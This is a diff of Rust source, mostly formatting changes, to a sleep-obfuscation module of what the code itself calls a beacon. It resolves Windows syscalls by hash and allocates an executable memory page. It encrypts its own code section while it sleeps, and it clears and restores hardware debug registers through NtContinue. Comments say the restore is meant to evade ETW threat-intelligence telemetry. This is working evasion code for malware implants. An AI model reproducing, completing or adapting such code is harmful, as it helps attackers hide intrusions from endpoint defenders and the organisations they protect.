@@ -6,8 +6,7 @@
 use crate::resolve;
 use core::ffi::c_void;
 
-static ENABLED: core::sync::atomic::AtomicBool =
-    core::sync::atomic::AtomicBool::new(cfg_on());
+static ENABLED: core::sync::atomic::AtomicBool = core::sync::atomic::AtomicBool::new(cfg_on());
 
 const fn cfg_on() -> bool {
     match option_env!("NYX_FLUCTUATION_OFF") {
@@ -16,8 +15,12 @@ const fn cfg_on() -> bool {
     }
 }
 
-pub fn set_enabled(on: bool) { ENABLED.store(on, core::sync::atomic::Ordering::Release); }
-pub fn enabled() -> bool { ENABLED.load(core::sync::atomic::Ordering::Acquire) }
+pub fn set_enabled(on: bool) {
+    ENABLED.store(on, core::sync::atomic::Ordering::Release);
+}
+pub fn enabled() -> bool {
+    ENABLED.load(core::sync::atomic::Ordering::Acquire)
+}
 
 pub fn sleep(seconds: u32) {
     if !enabled() {
@@ -58,36 +61,58 @@ impl<'a> Drop for DrGuard<'a> {
         // SAFETY: restore_dr_state writes debug registers via NtContinue. This
         // is the same operation the original code did explicitly after thunk_fn;
         // wrapping in a Drop guard ensures it runs on early-exit paths too.
-        unsafe { restore_dr_state(self.rt, &self.saved); }
+        unsafe {
+            restore_dr_state(self.rt, &self.saved);
+        }
     }
 }
 
 unsafe fn do_fluctuate(seconds: u32) -> bool {
-    let rt = match crate::syscalls::global() { Some(r) => r, None => return false };
-    let region = match crate::sleep::own_text_region() { Some(r) => r, None => return false };
+    let rt = match crate::syscalls::global() {
+        Some(r) => r,
+        None => return false,
+    };
+    let region = match crate::sleep::own_text_region() {
+        Some(r) => r,
+        None => return false,
+    };
 
     let prot_hash = crate::resolve::djb2(b"ntprotectvirtualmemory");
     let delay_hash = crate::resolve::djb2(b"ntdelayexecution");
-    let prot_ssn = match rt.ssn_by_hash(prot_hash) { Some(s) => s, None => return false };
-    let delay_ssn = match rt.ssn_by_hash(delay_hash) { Some(s) => s, None => return false };
+    let prot_ssn = match rt.ssn_by_hash(prot_hash) {
+        Some(s) => s,
+        None => return false,
+    };
+    let delay_ssn = match rt.ssn_by_hash(delay_hash) {
+        Some(s) => s,
+        None => return false,
+    };
     let prot_tramp = rt.trampoline_for(prot_ssn) as usize;
     let delay_tramp = rt.trampoline_for(delay_ssn) as usize;
-    if prot_tramp == 0 || delay_tramp == 0 { return false; }
+    if prot_tramp == 0 || delay_tramp == 0 {
+        return false;
+    }
 
     let nt_alloc_va = match resolve::export_addr(b"ntdll.dll", b"NtAllocateVirtualMemory") {
-        Some(a) => a, None => return false,
+        Some(a) => a,
+        None => return false,
     };
-    type NtAlloc = unsafe extern "system" fn(
-        usize, *mut *mut c_void, usize, *mut usize, u32, u32) -> i32;
+    type NtAlloc =
+        unsafe extern "system" fn(usize, *mut *mut c_void, usize, *mut usize, u32, u32) -> i32;
     let alloc: NtAlloc = core::mem::transmute(nt_alloc_va);
     let mut page: *mut c_void = core::ptr::null_mut();
     let mut sz: usize = 0x1000;
     let st = alloc(!0usize, &mut page, 0, &mut sz, 0x3000, 0x40);
-    if st < 0 || page.is_null() { return false; }
+    if st < 0 || page.is_null() {
+        return false;
+    }
 
     let thunk = crate::fluctuation_thunk::build(
-        prot_tramp, delay_tramp,
-        region.base as usize, region.len, seconds,
+        prot_tramp,
+        delay_tramp,
+        region.base as usize,
+        region.len,
+        seconds,
         // CRIT-5: pass `mem::unmask` so the thunk can call it inline after the
         // RX restore, closing the hardware-exception window (see thunk docs).
         // Absolute VA, PIC-stable (the beacon's .text base is fixed for the
@@ -112,7 +137,10 @@ unsafe fn do_fluctuate(seconds: u32) -> bool {
     // declaration drop order runs MaskGuard (unmask) BEFORE DrGuard (restore
     // DR) — matching the original explicit order (unmask .text, then restore
     // HWBPs). Created BEFORE mask() so the encrypted window is always covered.
-    let _dr_guard = DrGuard { saved: saved_dr, rt };
+    let _dr_guard = DrGuard {
+        saved: saved_dr,
+        rt,
+    };
     let _mask_guard = MaskGuard;
     crate::mem::mask();
     let thunk_fn: unsafe extern "system" fn() = core::mem::transmute(page);
@@ -123,7 +151,8 @@ unsafe fn do_fluctuate(seconds: u32) -> bool {
     // early-exit path that bypassed the thunk.
 
     let nt_free_va = match resolve::export_addr(b"ntdll.dll", b"NtFreeVirtualMemory") {
-        Some(a) => a, None => return true,
+        Some(a) => a,
+        None => return true,
     };
     type NtFree = unsafe extern "system" fn(usize, *mut *mut c_void, *mut usize, u32) -> i32;
     let free: NtFree = core::mem::transmute(nt_free_va);
@@ -136,8 +165,12 @@ unsafe fn do_fluctuate(seconds: u32) -> bool {
 
 /// Debug register snapshot: DR0-DR7.
 struct DrState {
-    dr0: u64, dr1: u64, dr2: u64, dr3: u64,
-    dr6: u64, dr7: u64,
+    dr0: u64,
+    dr1: u64,
+    dr2: u64,
+    dr3: u64,
+    dr6: u64,
+    dr7: u64,
     /// Full CONTEXT used for NtContinue restore (only debug regs set).
     ctx_buf: [u8; 1232],
 }
@@ -167,8 +200,18 @@ unsafe fn save_dr_state(rt: &crate::syscalls::Runtime) -> DrState {
             core::ptr::read_unaligned((buf.as_ptr() as usize + 0x068) as *const u64),
             core::ptr::read_unaligned((buf.as_ptr() as usize + 0x070) as *const u64),
         )
-    } else { (0, 0, 0, 0, 0, 0) };
-    DrState { dr0, dr1, dr2, dr3, dr6, dr7, ctx_buf: buf }
+    } else {
+        (0, 0, 0, 0, 0, 0)
+    };
+    DrState {
+        dr0,
+        dr1,
+        dr2,
+        dr3,
+        dr6,
+        dr7,
+        ctx_buf: buf,
+    }
 }
 
 /// Clear all debug registers on the current thread (DR0-DR7 = 0).
@@ -185,11 +228,8 @@ unsafe fn clear_dr_state(rt: &crate::syscalls::Runtime) {
     // intentionally clearing DRs BEFORE sleep — this is a one-time
     // sanitization, not a stealth HWBP set. The ETW TI event for
     // clearing DRs is not suspicious (legitimate debuggers do this).
-    let _ = crate::syscalls::nt_set_context_thread(
-        rt,
-        (-1isize) as usize,
-        buf.as_mut_ptr() as usize,
-    );
+    let _ =
+        crate::syscalls::nt_set_context_thread(rt, (-1isize) as usize, buf.as_mut_ptr() as usize);
 }
 
 /// Restore debug registers via NtContinue (NO ETW TI — stealth restore).
@@ -206,24 +246,12 @@ unsafe fn restore_dr_state(rt: &crate::syscalls::Runtime, saved: &DrState) {
         0x0010_0010u32, // CONTEXT_DEBUG_REGISTERS
     );
     // Write saved DR values.
-    core::ptr::write_unaligned(
-        (buf.as_mut_ptr() as usize + 0x048) as *mut u64, saved.dr0,
-    );
-    core::ptr::write_unaligned(
-        (buf.as_mut_ptr() as usize + 0x050) as *mut u64, saved.dr1,
-    );
-    core::ptr::write_unaligned(
-        (buf.as_mut_ptr() as usize + 0x058) as *mut u64, saved.dr2,
-    );
-    core::ptr::write_unaligned(
-        (buf.as_mut_ptr() as usize + 0x060) as *mut u64, saved.dr3,
-    );
-    core::ptr::write_unaligned(
-        (buf.as_mut_ptr() as usize + 0x068) as *mut u64, saved.dr6,
-    );
-    core::ptr::write_unaligned(
-        (buf.as_mut_ptr() as usize + 0x070) as *mut u64, saved.dr7,
-    );
+    core::ptr::write_unaligned((buf.as_mut_ptr() as usize + 0x048) as *mut u64, saved.dr0);
+    core::ptr::write_unaligned((buf.as_mut_ptr() as usize + 0x050) as *mut u64, saved.dr1);
+    core::ptr::write_unaligned((buf.as_mut_ptr() as usize + 0x058) as *mut u64, saved.dr2);
+    core::ptr::write_unaligned((buf.as_mut_ptr() as usize + 0x060) as *mut u64, saved.dr3);
+    core::ptr::write_unaligned((buf.as_mut_ptr() as usize + 0x068) as *mut u64, saved.dr6);
+    core::ptr::write_unaligned((buf.as_mut_ptr() as usize + 0x070) as *mut u64, saved.dr7);
     // IMPORTANT: NtContinue restores ALL register state from the CONTEXT,
     // including RIP and RSP. If we only set CONTEXT_DEBUG_REGISTERS, the
     // kernel should only restore debug registers, but to be safe, set
